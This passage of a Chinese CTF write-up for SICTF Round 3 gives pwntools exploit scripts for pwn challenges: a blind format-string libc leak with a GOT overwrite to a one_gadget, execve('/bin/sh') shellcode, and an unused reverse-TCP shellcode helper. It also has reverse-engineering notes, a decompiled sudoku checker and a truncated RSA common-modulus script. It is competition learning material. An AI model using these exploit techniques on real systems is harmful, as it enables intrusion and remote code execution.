set_elfbase: set_current_code_base_and_log(addr, offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># burp:</span></span><br><span class="line"><span class="comment"># for i in range(0x10):</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         new_func()</span></span><br><span class="line"><span class="comment">#     except (EOFError):</span></span><br><span class="line"><span class="comment">#         gift.io = copy_current_io()</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;syscall 0x55 ~ 0x65&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xchg rax, rsi</span></span><br><span class="line"><span class="string">    mov dx, 0xff</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pause() <span class="comment"># 6 bytes</span></span><br><span class="line">s(asm(pad).ljust(<span class="number">0xb</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + ShellcodeMall.amd64.execve_bin_sh)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="Easy-SI">Easy_SI</h2>
<p>格式化字符串漏洞盲打</p>
<p>友善的是远程版本为ubuntu22.04</p>
<p>leak完libc就摁打就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> gift</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;yuanshen.life&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;33000&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">mode = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;pwncli&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_tcp</span>():</span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> ShellcodeMall</span><br><span class="line">    reverse_tcp = ShellcodeMall.amd64.reverse_tcp_connect(ip=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">10001</span>)</span><br><span class="line">    <span class="keyword">return</span> reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import CurrentGadgets, gift</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift[&#x27;elf&#x27;] = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">gift[&#x27;libc&#x27;] = ELF()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop_rdi_ret = CurrentGadgets.pop_rdi_ret()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">execve_chain = CurrentGadgets.execve_chain(bin_sh_addr=0x11223344)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc search</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import LibcBox</span></span><br><span class="line"><span class="string">libc_box = LibcBox()</span></span><br><span class="line"><span class="string">libc_box.add_symbol(&quot;system&quot;, 0x640)</span></span><br><span class="line"><span class="string">libc_box.add_symbol(&quot;puts&quot;, 0x810)</span></span><br><span class="line"><span class="string">libc_box.search(download_symbols=False, download_so=False, download_deb=True) # 是否下载到本地</span></span><br><span class="line"><span class="string">read_offset = libc_box.dump(&quot;read&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadgets</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import get_current_one_gadget_from_libc</span></span><br><span class="line"><span class="string"># 获取当前装载的libc的gadget</span></span><br><span class="line"><span class="string">all_ogs = get_current_one_gadget_from_libc()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;And now let&#x27;s start the game!!!\n&quot;</span>, <span class="string">&quot;aaaaaaaa%p-%p-%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_libc = <span class="built_in">int</span>(rl()[-<span class="number">15</span>:-<span class="number">1</span>].decode(), <span class="number">16</span>) - <span class="number">0x607e2</span></span><br><span class="line">log(<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;And now let&#x27;s start the game!!!\n&quot;</span>, <span class="string">&quot;aaaaaaaa%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_rsi = <span class="built_in">int</span>(rl()[-<span class="number">15</span>:-<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(leak_rsi))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">ogs = [<span class="number">0xebc81</span>, <span class="number">0xebc85</span>, <span class="number">0xebc88</span>, <span class="number">0xebce2</span>, <span class="number">0xebd38</span>, <span class="number">0xebd3f</span>, <span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;And now let&#x27;s start the game!!!\n&quot;</span>, <span class="string">&quot;aaaaaaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_libc = <span class="built_in">int</span>(rl()[-<span class="number">15</span>:-<span class="number">1</span>].decode(), <span class="number">16</span>) - (<span class="number">0x7ffff7c29e40</span> - <span class="number">0x7ffff7c00000</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;And now let&#x27;s start the game!!!\n&quot;</span>, flat([</span><br><span class="line">    fmtstr_payload(offset, &#123;<span class="number">0x404018</span>: leak_libc + ogs[<span class="number">1</span>]&#125;),</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sa(&quot;And now let&#x27;s start the game!!!\n&quot;, flat([</span></span><br><span class="line"><span class="comment">#     b&quot;%7$s\x00\x00\x00\x00&quot;,</span></span><br><span class="line"><span class="comment">#     0x404018</span></span><br><span class="line"><span class="comment"># ]))</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="stack">stack</h2>
<p>漏洞点在于比较的时候比较1bytes，读入确是4bytes读入</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%207.png" alt="Untitled"></p>
<p>控制rip随便打了</p>
<h1>Reverse</h1>
<h2 id="CloseMe">CloseMe</h2>
<p>IDA动态调试，摁调之后就会发现最后的最后有一个神秘的异或</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%208.png" alt="Untitled"></p>
<p>得到一个hint：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Every time you close the messagebox by click `Yes` <span class="keyword">or</span> `No`, it will be stored. Just choose Yes/No(<span class="number">1</span>/<span class="number">0</span>) <span class="keyword">in</span> a certain order which <span class="keyword">is</span> the flag, such <span class="keyword">as</span> <span class="number">0</span>1001</span><br></pre></td></tr></table></figure>
<p>然后往上的这里有个逻辑是判断的</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%209.png" alt="Untitled"></p>
<p>v40为我们输入的字符串对应十六进制</p>
<p>然后还得调调 最后按这个顺序输入即可满足条件</p>
<p>最后包上SICTF{}</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0110001111100101</span><br></pre></td></tr></table></figure>
<h2 id="SweetTofu">SweetTofu</h2>
<p>动态调试跟着跟着进入了一个xor函数</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2010.png" alt="Untitled"></p>
<p>异或一下就是flag</p>
<h2 id="Ez-pyc">Ez_pyc</h2>
<p>pycdc解密不了 发现python是3.8，配个anaconda就可以用decompyle3和uncompyle6等解密</p>
<p>decompyle3解密一下，然后改了改尝试爆破，最后发现不行，看上去很像9*9数独。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.13 (default, Mar 28 2022, 11:38:47) </span></span><br><span class="line"><span class="comment"># [GCC 7.5.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: E:\CTF赛题\ez_pyc\233.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2024-02-16 09:19:13</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1178 bytes</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># # # # # # # # # #</span></span><br><span class="line"><span class="string"># 0 1 9 0 0 0 3 0 7</span></span><br><span class="line"><span class="string"># 8 0 0 0 0 0 0 0 0</span></span><br><span class="line"><span class="string"># 4 0 0 0 0 0 2 0 0</span></span><br><span class="line"><span class="string"># 0 0 0 0 3 0 0 0 0</span></span><br><span class="line"><span class="string"># 5 0 0 0 6 0 0 2 0</span></span><br><span class="line"><span class="string"># 0 7 0 0 0 0 0 3 1</span></span><br><span class="line"><span class="string"># 0 0 0 0 0 0 0 0 0</span></span><br><span class="line"><span class="string"># 0 0 8 0 9 0 7 0 0</span></span><br><span class="line"><span class="string"># 0 0 0 0 0 0 0 0 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 1 9 0 0 0 3 0 7</span></span><br><span class="line"><span class="string">8 0 0 0 0 0 0 0 0</span></span><br><span class="line"><span class="string">4 0 0 0 0 0 2 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 3 0 0 0 0</span></span><br><span class="line"><span class="string">5 0 0 0 6 0 0 2 0</span></span><br><span class="line"><span class="string">0 7 0 0 0 0 0 3 1</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 8 0 9 0 7 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 0 0 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2456835127469673891564192578837194925486324875196156342796214853</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2456835127469673891564192578837194925486324875196156342796214853</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">219456387835127469467389215641932578583761924972548631324875196158693742796214853</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 1 9 4 5 6 3 8 7</span></span><br><span class="line"><span class="string">8 3 5 1 2 7 4 6 9</span></span><br><span class="line"><span class="string">4 6 7 3 8 9 2 1 5</span></span><br><span class="line"><span class="string">6 4 1 9 3 2 5 7 8</span></span><br><span class="line"><span class="string">5 8 3 7 6 1 9 2 4</span></span><br><span class="line"><span class="string">9 7 2 5 4 8 6 3 1</span></span><br><span class="line"><span class="string">3 2 4 8 7 5 1 9 6</span></span><br><span class="line"><span class="string">1 5 8 6 9 3 7 4 2</span></span><br><span class="line"><span class="string">7 9 6 2 1 4 8 5 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">k = [[<span class="string">&#x27;#&#x27;</span>] * <span class="number">10</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>] + [<span class="number">0</span>] * <span class="number">3</span> + [<span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">8</span>] + [<span class="number">0</span>] * <span class="number">8</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">4</span>] + [<span class="number">0</span>] * <span class="number">5</span> + [<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>] + [<span class="number">0</span>] * <span class="number">4</span> + [<span class="number">3</span>] + [<span class="number">0</span>] * <span class="number">4</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">5</span>] + [<span class="number">0</span>] * <span class="number">3</span> + [<span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">0</span>, <span class="number">7</span>] + [<span class="number">0</span>] * <span class="number">5</span> + [<span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>] + [<span class="number">0</span>] * <span class="number">9</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&quot;&#x27;#&#x27;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>] + [<span class="number">0</span>] * <span class="number">9</span>]</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">s = <span class="built_in">str</span>(<span class="number">2456835127469673891564192578837194925486324875196156342796214853</span>) <span class="comment"># 十六进制输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="built_in">str</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>)]: <span class="comment"># 这里判断1~9??</span></span><br><span class="line">            s[cnt + <span class="number">43690</span>] = <span class="number">1</span> <span class="comment"># error</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># 所以输入都得是1~9 数字十六进制输入 byd数独</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k[i])):</span><br><span class="line">                    <span class="keyword">if</span> k[i][j] == <span class="number">0</span>:</span><br><span class="line">                        k[i][j] = <span class="built_in">int</span>(s[cnt]) <span class="comment"># fun 必须先填满</span></span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(cnt)</span><br><span class="line">                        <span class="built_in">print</span>(k)</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> k[i]:</span><br><span class="line">                                    s[cnt + <span class="number">3735928559</span>] = <span class="number">0</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                                        tmp = []</span><br><span class="line">                                        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                                            tmp.append(k[j][i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        e = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">del</span> e</span><br><span class="line">            <span class="comment">#     else:</span></span><br><span class="line">            <span class="comment">#         for j in range(1, len(k)):</span></span><br><span class="line">            <span class="comment">#             if j not in tmp:</span></span><br><span class="line">            <span class="comment">#                 s[cnt + 3735928559] = 1</span></span><br><span class="line">            <span class="comment">#         else:</span></span><br><span class="line">            <span class="comment">#             for i in range(1, len(k), int(len(k) ** 0.5)):</span></span><br><span class="line">            <span class="comment">#                 for j in range(1, len(k), int(len(k) ** 0.5)):</span></span><br><span class="line">            <span class="comment">#                     square = [k[x][y] for x in range(i, i + 3) for y in iter((range(j, j + 3)))]</span></span><br><span class="line">            <span class="comment">#                     for t in range(1, len(k)):</span></span><br><span class="line">            <span class="comment">#                         if t not in tmp:</span></span><br><span class="line">            <span class="comment">#                             s[cnt + 3735928559] = 2</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#             else:</span></span><br><span class="line">            <span class="comment">#                 m = hashlib.md5(s.encode()).hexdigest()</span></span><br><span class="line">            <span class="comment">#                 if m == &#x27;60b845d09f7b818a1e1e6cd0f4a04d96&#x27;:</span></span><br><span class="line">            <span class="comment">#                     print(&#x27;SICTF&#123;%s&#125;&#x27; % m)</span></span><br><span class="line">            <span class="comment">#                 else:</span></span><br><span class="line">            <span class="comment">#                     print(&#x27;试着换一种解嘞qwq&#x27;)</span></span><br><span class="line">            <span class="comment">#                 input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         pass</span></span><br><span class="line"><span class="comment">#     finally:</span></span><br><span class="line"><span class="comment">#         e = None</span></span><br><span class="line"><span class="comment">#         del e</span></span><br><span class="line"><span class="comment"># okay decompiling ./ez_pyc.pyc</span></span><br></pre></td></tr></table></figure>
<p>但是这个数独有很多解，找了个项目能爆数独</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sanmusen214/solve_99sudoku">https://github.com/sanmusen214/solve_99sudoku</a></p>
<h2 id="Battle-City">Battle City</h2>
<p>我是游戏大师~</p>
<h2 id="ArtBreaker">ArtBreaker</h2>
<p>IDA缩放一下图形显示就有flag了</p>
<h2 id="Baby-C">Baby_C++</h2>
<p>明文flag</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2011.png" alt="Untitled"></p>
<h1>Crypto</h1>
<h2 id="Vigenere">Vigenere</h2>
<p>在线网站跑一下</p>
<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">Vigenere Solver | guballa.de</a></p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2012.png" alt="Untitled"></p>
<h2 id="SuperRSA">SuperRSA</h2>
<p>不互素的共模攻击</p>
<p>模板套一套</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line"></span><br><span class="line">_,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="built_in">print</span>(s1, s2)</span><br><span class="line">m1=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line">x=gmpy2.gcd(e1,e2)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    m11=m1+k*n</span><br><span class="line">    m,s=gmpy2.iroot(m11,x)</span><br><span class="line">    <span class="keyword">if</span> s:</span><br><span class="line">        